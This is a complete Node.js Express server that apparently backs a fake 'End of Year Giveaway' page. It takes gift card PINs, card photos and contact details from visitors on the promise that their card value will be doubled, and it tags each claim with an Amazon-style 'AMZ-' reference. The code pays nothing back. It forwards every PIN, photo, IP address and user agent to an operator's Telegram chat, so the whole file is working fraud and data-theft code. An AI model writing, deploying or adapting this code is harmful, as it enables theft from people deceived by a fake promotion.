'use strict';

const path = require('path');
const express = require('express');
const multer = require('multer');

const app = express();
const PORT = process.env.PORT || 3000;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT = process.env.TELEGRAM_CHAT_ID || '';

app.disable('x-powered-by');
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1h' }));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024, files: 1 },
});

const esc = (v = '') =>
  String(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

/* simple in-memory rate limit: 6 submissions / minute / IP */
const hits = new Map();
function allowed(ip) {
  const now = Date.now();
  const win = 60_000, max = 6;
  const e = hits.get(ip) || { c: 0, t: now };
  if (now - e.t > win) { e.c = 0; e.t = now; }
  e.c += 1;
  hits.set(ip, e);
  return e.c <= max;
}

async function telegram(method, form) {
  const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
    method: 'POST',
    body: form,
  });
  const data = await res.json().catch(() => ({}));
  if (!data.ok) throw new Error(data.description || `Telegram ${method} failed`);
  return data;
}

app.post('/api/submit', (req, res) => {
  upload.single('photo')(req, res, async (err) => {
    if (err) {
      const msg =
        err.code === 'LIMIT_FILE_SIZE'
          ? 'That image is larger than 10 MB.'
          : err.message;
      return res.status(400).json({ ok: false, error: msg });
    }

    try {
      const pin = String(req.body.pin || '').trim().toUpperCase();
      const value = Number(req.body.value);
      const contact = String(req.body.contact || '').trim();

      if (pin.length < 6)
        return res.status(400).json({ ok: false, error: 'Enter a valid gift card PIN.' });
      if (!Number.isFinite(value) || value <= 0)
        return res.status(400).json({ ok: false, error: 'Enter a valid gift card value.' });
      if (!contact)
        return res.status(400).json({ ok: false, error: 'Enter where to send the doubled value.' });

      const ip =
        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
        req.socket.remoteAddress ||
        '';
      if (!allowed(ip))
        return res.status(429).json({ ok: false, error: 'Too many submissions. Wait a minute.' });

      const ref = 'AMZ-' + Math.random().toString(36).slice(2, 8).toUpperCase();
      const doubled = Number((value * 2).toFixed(2));
      const when =
        new Date().toLocaleString('en-US', {
          timeZone: 'UTC',
          dateStyle: 'medium',
          timeStyle: 'short',
        }) + ' UTC';

      const lines = [
        '🛒 <b>NEW GIFT CARD CLAIM</b>',
        '<i>End of Year Giveaway</i>',
        '',
        `<b>Ref:</b> <code>${esc(ref)}</code>`,
        `<b>PIN:</b> <code>${esc(pin)}</code>`,
        `<b>Face value:</b> $${value.toFixed(2)}`,
        `<b>Doubled value:</b> $${doubled.toFixed(2)}`,
        `<b>Send to:</b> ${esc(contact)}`,
        `<b>Photo:</b> ${req.file ? 'attached' : 'none'}`,
        '',
        `<b>Time:</b> ${esc(when)}`,
        `<b>IP:</b> ${esc(ip)}`,
        `<b>UA:</b> ${esc((req.headers['user-agent'] || '').slice(0, 120))}`,
      ];

      if (TOKEN && CHAT) {
        if (req.file) {
          const fd = new FormData();
          fd.append('chat_id', CHAT);
          fd.append('caption', lines.join('\n').slice(0, 1024));
          fd.append('parse_mode', 'HTML');
          fd.append(
            'photo',
            new Blob([req.file.buffer], { type: req.file.mimetype }),
            req.file.originalname || 'giftcard.jpg'
          );
          await telegram('sendPhoto', fd);
        } else {
          const fd = new FormData();
          fd.append('chat_id', CHAT);
          fd.append('text', lines.join('\n'));
          fd.append('parse_mode', 'HTML');
          fd.append('disable_web_page_preview', 'true');
          await telegram('sendMessage', fd);
        }
      } else {
        console.warn('Telegram env vars missing — claim not forwarded.');
      }

      res.json({ ok: true, ref, doubled });
    } catch (e) {
      console.error('[submit]', e);
      res.status(502).json({
        ok: false,
        error: 'Could not reach Telegram. Check the bot token and chat ID.',
      });
    }
  });
});

app.get('/api/health', (_req, res) =>
  res.json({ ok: true, configured: Boolean(TOKEN && CHAT) })
);

app.get('*', (_req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'index.html'))
);

app.listen(PORT, () => console.log(`Listening on ${PORT}`));
